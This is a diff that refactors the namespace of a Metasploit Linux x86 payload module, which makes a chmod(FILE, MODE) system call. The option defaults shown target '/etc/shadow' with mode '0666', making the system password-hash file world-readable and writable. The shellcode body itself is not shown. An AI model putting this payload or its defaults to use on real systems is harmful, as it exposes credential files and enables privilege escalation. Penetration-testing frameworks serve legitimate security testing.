@@ -1,17 +1,12 @@
 require 'msf/core'
 
-module Msf
-module Payloads
-module Singles
-module Linux
-module X86
 
 ###
 #  Linux Chmod(file, mode)
 #
 #  Kris Katterjohn - 03/03/2008
 ###
-module Chmod
+module Metasploit3
 	include Msf::Payload::Single
 	include Msf::Payload::Linux
 
@@ -29,7 +24,7 @@ module Chmod
 			[
 				OptString.new('FILE', [ true, "Filename to chmod", "/etc/shadow" ]),
 				OptString.new('MODE', [ true, "File mode (octal)", "0666" ]),
-			], Msf::Payloads::Singles::Linux::X86::Chmod)
+			], self.class)
 	end
 
 	# Dynamically generates chmod(FILE, MODE) + exit()
@@ -45,5 +40,5 @@ module Chmod
 	end
 end
 
-end end end end end
+    
 
